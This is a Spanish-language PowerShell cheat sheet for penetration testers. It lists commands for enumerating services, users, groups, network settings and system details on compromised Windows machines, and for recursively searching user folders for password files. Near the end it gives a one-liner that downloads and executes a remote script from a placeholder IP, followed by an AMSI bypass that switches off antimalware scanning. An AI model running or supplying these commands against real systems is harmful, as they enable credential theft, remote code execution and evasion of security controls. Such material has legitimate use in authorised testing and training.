
## Listar ubicaciones de los servicios ejecutados 

Get-WmiObject -class win32_service |Format-List *

Get-WmiObject -class win32_service |Sort-Object -Unique PathName | fl Pathname

## Listar procesos sin que se repitan 

Get-Process | Sort-Object -Unique


# 🛠️ PowerShell for Pentesters

Comandos útiles en PowerShell para tareas de reconocimiento, post-explotación, evasión y búsqueda de información sensible en sistemas Windows comprometidos.

---

## 📋 Ver servicios

```powershell
Get-Service | ForEach-Object { $_.Name }

```

📍 Ubicaciones de los servicios ejecutados

```powershell
Get-WmiObject -Class win32_service | Format-List *

Get-WmiObject -Class win32_service | Sort-Object -Property PathName -Unique | Format-List PathName
```

🧠 Listar procesos únicos

```powershell
Get-Process | Sort-Object -Property ProcessName -Unique


👤 Enumeración de usuarios

```powershell
whoami
whoami /all
Get-WmiObject -Class Win32_ComputerSystem | Select-Object UserName
Get-LocalUser
net user
```

🛡️ Grupos y privilegios

```powershell
net localgroup administrators
```

🌐 Enumeración de red

```powershell
Get-NetAdapter | Format-Table
Get-NetIPAddress | Format-Table
Get-NetRoute
Get-NetTCPConnection | Where-Object { $_.State -eq "Established" }
```

🖥️ Información del sistema

```powershell
Get-WmiObject -Class Win32_OperatingSystem
Get-WmiObject -Class Win32_ComputerSystem
Get-ChildItem Env:
```

🔍 Buscar archivos sensibles por contenido

```powershell
Select-String -Path "C:\\Users\\*\\Documents\\*.txt" -Pattern "password"

Get-ChildItem -Path "C:\\Users" -Recurse -Include *.txt -ErrorAction SilentlyContinue |
Select-String -Pattern "password"
```

🗂️ Buscar archivos sensibles por nombre

```powershell
Get-ChildItem -Path "C:\\Users" -Recurse -ErrorAction SilentlyContinue -Force |
Where-Object { $_.Name -match "password|contraseña" }

Get-ChildItem -Path "C:\\Users" -Recurse -Include *password*,*passwords*,*contraseña* -File -ErrorAction SilentlyContinue
```

📅 Persistencia

```powershell
Get-ScheduledTask | Select-Object TaskName, TaskPath, State
Get-ChildItem -Path "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
```

🔧 Descarga y ejecución remota de scripts

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://<IP>/script.ps1")
```


🧱 Bypass de restricciones

```powershell

[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
